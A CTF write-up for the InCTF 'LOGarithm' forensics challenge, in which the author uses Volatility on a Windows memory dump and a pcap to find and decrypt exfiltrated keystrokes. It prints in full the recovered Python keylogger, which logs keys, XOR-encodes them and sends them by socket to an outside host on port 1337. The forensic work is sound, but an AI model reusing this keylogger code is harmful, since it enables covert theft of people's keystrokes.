# LOGarithm
InCTF had some nice forensics challenges. I ended up solving 3 out of the 4.

In this writeup, I chose to talk about the LOGarithm challenge, even though its one of the easiest ones, but I really enjoyed it.

![desc](https://i.ibb.co/d2NHSZn/log.png)

In this challenge, we were given a memory dump of a windows machine and a network traffic capture and we are asked to find the exfiltrated data.

We started off by identifying the profile image of the system.
![img](https://i.ibb.co/34VFfwc/Screenshot-1.png)

After that, we ran pstree which shows a python & a cmd processes ran by explorer.exe.
```
volatility -f Evidence.vmem --profile=Win7SP1x64 pstree | tee pstree.txt
```
```
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0xfffffa8002d99b30:svchost.exe                       768    504      7    270 2020-06-02 10:36:15 UTC+0000
 0xfffffa80030b6500:dllhost.exe                      1796    504     17    198 2020-06-02 10:36:19 UTC+0000
 0xfffffa8002cef060:spoolsv.exe                      1160    504     13    264 2020-06-02 10:36:17 UTC+0000
 0xfffffa8002d42970:svchost.exe                       672    504     10    353 2020-06-02 10:36:15 UTC+0000
. 0xfffffa80030cbb30:WmiPrvSE.exe                    1764    672     10    202 2020-06-02 10:36:19 UTC+0000
. 0xfffffa8002b63500:WmiPrvSE.exe                    2280    672     11    292 2020-06-02 10:36:39 UTC+0000
 0xfffffa8002e7d350:vmtoolsd.exe                     1416    504     10    270 2020-06-02 10:36:18 UTC+0000
. 0xfffffa80021208d0:cmd.exe                         2556   1416      0 ------ 2020-06-02 10:40:46 UTC+0000
 0xfffffa8003214b30:svchost.exe                      2716    504     15    223 2020-06-02 10:36:55 UTC+0000
 0xfffffa80033e9060:SearchIndexer.                   2452    504     12    622 2020-06-02 10:36:45 UTC+0000
. 0xfffffa80038cd350:SearchProtocol                  2528   2452      8    282 2020-06-02 10:40:06 UTC+0000
. 0xfffffa800319fb30:SearchFilterHo                  3528   2452      6    101 2020-06-02 10:40:06 UTC+0000
 0xfffffa8002dccb30:svchost.exe                       816    504     21    475 2020-06-02 10:36:15 UTC+0000
. 0xfffffa8002eafb30:audiodg.exe                      288    816      7    131 2020-06-02 10:36:16 UTC+0000
 0xfffffa8002db9060:svchost.exe                      1204    504     20    307 2020-06-02 10:36:17 UTC+0000
 0xfffffa80031634a0:msdtc.exe                        1924    504     15    153 2020-06-02 10:36:19 UTC+0000
 0xfffffa8002e58b30:svchost.exe                       928    504     14    291 2020-06-02 10:36:16 UTC+0000
. 0xfffffa800328eb30:dwm.exe                          296    928      4     72 2020-06-02 10:36:38 UTC+0000
 0xfffffa80032943f0:sppsvc.exe                       3344    504      4    144 2020-06-02 10:38:19 UTC+0000
 0xfffffa8002e85b30:svchost.exe                       976    504     43    975 2020-06-02 10:36:16 UTC+0000
. 0xfffffa8002d3e060:taskeng.exe                     1172    976      5     79 2020-06-02 10:36:17 UTC+0000
 0xfffffa800335a060:WmiApSrv.exe                     3276    504      6    116 2020-06-02 10:38:44 UTC+0000
 0xfffffa8002ee1b30:svchost.exe                       344    504     24    659 2020-06-02 10:36:16 UTC+0000
. 0xfffffa80027e2060:wininit.exe                      412    344      3     74 2020-06-02 10:36:08 UTC+0000
.. 0xfffffa8002b51b30:lsm.exe                         528    412      9    144 2020-06-02 10:36:08 UTC+0000
.. 0xfffffa8002b60660:lsass.exe                       520    412      6    558 2020-06-02 10:36:08 UTC+0000
.. 0xfffffa8002b4a320:services.exe                    504    412     11    208 2020-06-02 10:36:08 UTC+0000
... 0xfffffa800327e060:taskhost.exe                  1372    504      9    146 2020-06-02 10:36:38 UTC+0000
... 0xfffffa8002d708e0:vmacthlp.exe                   736    504      4     53 2020-06-02 10:36:15 UTC+0000
... 0xfffffa8002dd4060:VGAuthService.                1380    504      4     84 2020-06-02 10:36:18 UTC+0000
... 0xfffffa8002cc2b30:svchost.exe                   1056    504     17    367 2020-06-02 10:36:17 UTC+0000
... 0xfffffa8002e14390:svchost.exe                   1500    504     13    337 2020-06-02 10:38:20 UTC+0000
. 0xfffffa80023eeb30:csrss.exe                        352    344      9    489 2020-06-02 10:36:08 UTC+0000
.. 0xfffffa8002fd1730:conhost.exe                    1288    352      0 ------ 2020-06-02 10:40:46 UTC+0000
 0xfffffa800327e060:taskhost.exe                     1372    504      9    146 2020-06-02 10:36:38 UTC+0000
 0xfffffa8002d708e0:vmacthlp.exe                      736    504      4     53 2020-06-02 10:36:15 UTC+0000
 0xfffffa8002dd4060:VGAuthService.                   1380    504      4     84 2020-06-02 10:36:18 UTC+0000
 0xfffffa8002cc2b30:svchost.exe                      1056    504     17    367 2020-06-02 10:36:17 UTC+0000
 0xfffffa8002e14390:svchost.exe                      1500    504     13    337 2020-06-02 10:38:20 UTC+0000
 0xfffffa8003011270:chrome.exe                       4032   2636     11    174 2020-06-02 10:37:31 UTC+0000
 0xfffffa8002fcb640:chrome.exe                       2648   2636      9     91 2020-06-02 10:36:55 UTC+0000
 0xfffffa8000e17b30:chrome.exe                       1284   2636      0 ------ 2020-06-02 10:38:55 UTC+0000
. 0xfffffa80032bc4a0:explorer.exe                    1100   1284     36    933 2020-06-02 10:36:38 UTC+0000
.. 0xfffffa80032feb30:vmtoolsd.exe                   2208   1100      8    182 2020-06-02 10:36:39 UTC+0000
.. 0xfffffa800347fb30:chrome.exe                     2636   1100     34    866 2020-06-02 10:36:55 UTC+0000
... 0xfffffa8002058930:chrome.exe                    3812   2636     13    188 2020-06-02 10:37:20 UTC+0000
... 0xfffffa8003141060:chrome.exe                    3124   2636     15    272 2020-06-02 10:37:08 UTC+0000
... 0xfffffa8000f52220:chrome.exe                    3480   2636     18    352 2020-06-02 10:37:14 UTC+0000
... 0xfffffa8000f8e3d0:chrome.exe                    3728   2636     17    306 2020-06-02 10:37:18 UTC+0000
... 0xfffffa8000de00f0:chrome.exe                    3424   2636      0 ------ 2020-06-02 10:37:13 UTC+0000
... 0xfffffa8003547060:chrome.exe                    2804   2636     10    235 2020-06-02 10:36:55 UTC+0000
... 0xfffffa8003549b30:chrome.exe                    2812   2636     16    324 2020-06-02 10:36:55 UTC+0000
.. 0xfffffa8000f48b30:cmd.exe                        3532   1100      1     19 2020-06-02 10:37:57 UTC+0000
.. 0xfffffa80030b0060:pythonw.exe                    2216   1100      3    163 2020-06-02 10:40:36 UTC+0000
 0xfffffa8002058930:chrome.exe                       3812   2636     13    188 2020-06-02 10:37:20 UTC+0000
 0xfffffa8003141060:chrome.exe                       3124   2636     15    272 2020-06-02 10:37:08 UTC+0000
 0xfffffa8000f52220:chrome.exe                       3480   2636     18    352 2020-06-02 10:37:14 UTC+0000
 0xfffffa8000f8e3d0:chrome.exe                       3728   2636     17    306 2020-06-02 10:37:18 UTC+0000
 0xfffffa8000de00f0:chrome.exe                       3424   2636      0 ------ 2020-06-02 10:37:13 UTC+0000
 0xfffffa8003547060:chrome.exe                       2804   2636     10    235 2020-06-02 10:36:55 UTC+0000
 0xfffffa8003549b30:chrome.exe                       2812   2636     16    324 2020-06-02 10:36:55 UTC+0000
 0xfffffa8000ca19e0:System                              4      0     96    621 2020-06-02 10:36:06 UTC+0000
. 0xfffffa8001c31310:smss.exe                         264      4      2     29 2020-06-02 10:36:06 UTC+0000
 0xfffffa8002808850:csrss.exe                         404    396     11    356 2020-06-02 10:36:08 UTC+0000
. 0xfffffa8000f2d060:conhost.exe                     3524    404      3     51 2020-06-02 10:37:57 UTC+0000
 0xfffffa8002b29810:winlogon.exe                      460    396      4    110 2020-06-02 10:36:08 UTC+0000
 0xfffffa8003479880:GoogleCrashHan                   2584   2128      6     90 2020-06-02 10:36:47 UTC+0000
 0xfffffa80033b9b30:GoogleCrashHan                   2576   2128      6    101 2020-06-02 10:36:47 UTC+0000
```
By Checking the commands ran from cmd, we noticed a suspecious python script by the name keylogger.py.
```
volatility -f Evidence.vmem --profile=Win7SP1x64 cmdline | tee cmdline.txt
```
```************************************************************************
pythonw.exe pid:   2216
Command line : "C:\Python27\pythonw.exe" "C:\Python27\Lib\idlelib\idle.pyw" -e "C:\Users\Mike\Downloads\keylogger.py"
************************************************************************
```
For more indepth analysis we extracted the script using filescan and dumpfiles plugins.
```
l33t > ~/CTFs/inctf > volatility -f Evidence.vmem --profile=Win7SP1x64 filescan | grep keylogger.py
Volatility Foundation Volatility Framework 2.6
0x000000003ee119b0     16      0 R--rwd \Device\HarddiskVolume1\Users\Mike\Downloads\keylogger.py

l33t > ~/CTFs/inctf > volatility -f Evidence.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000003ee119b0 --dump-dir=lol
Volatility Foundation Volatility Framework 2.6
DataSectionObject 0x3ee119b0   None   \Device\HarddiskVolume1\Users\Mike\Downloads\keylogger.py
```

```python
import socket, os
from pynput.keyboard import Key, Listener
import socket

import logging
list1 = []

def keylog():
    dir = r"C:\Users\Mike\Desktop\key.log"
    logging.basicConfig(filename=dir, level=logging.DEBUG,format='%(message)s')

    def on_press(key):
        a = str(key).replace("u'","").replace("'","")
        list1.append(a)

    def on_release(key):
        if str(key) == 'Key.esc':
            print "Data collection complete. Sending data to master"
            logging.info(' '.join(list1))
            logging.shutdown()
            master_encrypt()
        

    with Listener(
        on_press = on_press,
        on_release = on_release) as listener:
        listener.join()

def send_to_master(data):
    s = socket.socket()
    host = '18.140.60.203'
    port = 1337
    
    s.connect((host, port))
    key_log = data
    s.send(key_log)
    s.close()
    exit(1)

def master_encrypt():
    mkey = os.getenv('t3mp')
    f = open("C:/Users/Mike/Desktop/key.log","r")
    modified = ''.join(f.readlines()).replace("\n","")
    f.close()
    data = master_xor(mkey, modified).encode("base64")
    os.unlink("C:/Users/Mike/Desktop/key.log")
    send_to_master(data)

def master_xor(msg,mkey):
    l = len(mkey)
    xor_complete = ""

    for i in range(0, len(msg)):
        xor_complete += chr(ord(msg[i]) ^ ord(mkey[i % l]))
    
    return xor_complete

if __name__ == "__main__":
    keylog()
```

Upon reading the source code of the keylogger, we can conclude that the script collect all the keyboard strokes, save it to the file C:/Users/Mike/Desktop/key.log(which will be deleted after the end of the process) , xor it with a key saved as an environment variable(t3mp) and then send it(after b64 encoding it) through port 1337 to the attacker's C2 server.

Now, we just need to collect different variables used to recover the exfiltrated data. To do this, we extracted the key using envars plugin.
```l33t > ~/CTFs/inctf > volatility -f Evidence.vmem --profile=Win7SP1x64 envars | tee envars.txt
```
```
2216 pythonw.exe          0x0000000000304d50 t3mp                           UXpwY1VIbDBhRzl1TWpkY08wTTZYRkI1ZEdodmJqSTNYRk5qY21sd2RITTdRenBjVjJsdVpHOTNjMXh6ZVhOMFpXMHpNanRET2x4WAphVzVrYjNkek8wTTZYRmRwYm1SdmQzTmNVM2x6ZEdWdE16SmNWMkpsYlR0RE9seFhhVzVrYjNkelhGTjVjM1JsYlRNeVhGZHBibVJ2CmQzTlFiM2RsY2xOb1pXeHNYSFl4TGpCY08wTTZYRkJ5YjJkeVlXMGdSbWxzWlhNZ0tIZzROaWxjVG0xaGNDNURUMDA3TGtWWVJUc3UKUWtGVU95NURUVVE3TGxaQ1V6c3VWa0pGT3k1S1V6c3VTbE5GT3k1WFUwWTdMbGRUU0RzdVRWTkQK
```
For this step, the pcap comes handy. We started by filtring the packets to only show the ones sent through port 1337 and then followed them.
![filter](https://i.ibb.co/n6Nxdyh/Screenshot-3.png)
![data](https://i.ibb.co/bRM1T4w/Screenshot-4.png)

At this point, we have all the data we need, we just need to reverse the encryption algorithm, i used python to create a simple decryptor.
```python
import base64

mkey="UXpwY1VIbDBhRzl1TWpkY08wTTZYRkI1ZEdodmJqSTNYRk5qY21sd2RITTdRenBjVjJsdVpHOTNjMXh6ZVhOMFpXMHpNanRET2x4WAphVzVrYjNkek8wTTZYRmRwYm1SdmQzTmNVM2x6ZEdWdE16SmNWMkpsYlR0RE9seFhhVzVrYjNkelhGTjVjM1JsYlRNeVhGZHBibVJ2CmQzTlFiM2RsY2xOb1pXeHNYSFl4TGpCY08wTTZYRkJ5YjJkeVlXMGdSbWxzWlhNZ0tIZzROaWxjVG0xaGNDNURUMDA3TGtWWVJUc3UKUWtGVU95NURUVVE3TGxaQ1V6c3VWa0pGT3k1S1V6c3VTbE5GT3k1WFUwWTdMbGRUU0RzdVRWTkQK"
msg="PXgRVzcRMWkNZGIccglMH3QwUAR5XxgQdDh6PHJFaVJ6KkQCRAVqGHMfKyB8GEUQOlcRF0RTcj90MUR8RSUnE3gZOhIHM1A7bzFuCW0qSFN6IkgEKD9eKz0pEytBCHIpdFNYU3cKFRF4CSYTOg9uAkUFGBR0IHo/ciY3DnceWToCGXEBdANuZW1EWAV6N0QcATwfRTsEKCNtNFA4PBV8QzosXwdFEkgadjEzC3cZJgIDGEgSdBl2XW16Lwp3HzonAyJIGHoDJxBMJSJbJRlxKXQcZl1tX3I4PEtWPApYFixFF248cw0JTXo0GCo/RBgodDl6bXJaan48E2QYDT8KLG0LRCBCHB0DeR8AJzxEVDR6MTc2TzILCT5nUVgPZylkIXVyIW03YR10IFQ4dzlqMkNfdS51eVQkdjoZWG49cjx2HSBKejQIADJUdlJDUnYhQVVQaXR4Dkh9QiZXAFZ2J0IgFSR0QUtUdzJ1PDItSj4SJjEwdVZyFkQ3cjB0IDQy"
#a=base64.b64decode(_mkey)
b=base64.b64decode(msg)

def dec_xor(msg,mkey):
    l = len(mkey)
    xor_complete = ""

    for i in range(0, len(msg)):
        xor_complete += chr(ord(msg[i]) ^ ord(mkey[i%l]))
    
    return xor_complete

print(dec_xor(b,mkey))
```
![flag](https://i.ibb.co/Yj70JZn/Screenshot-5.png)

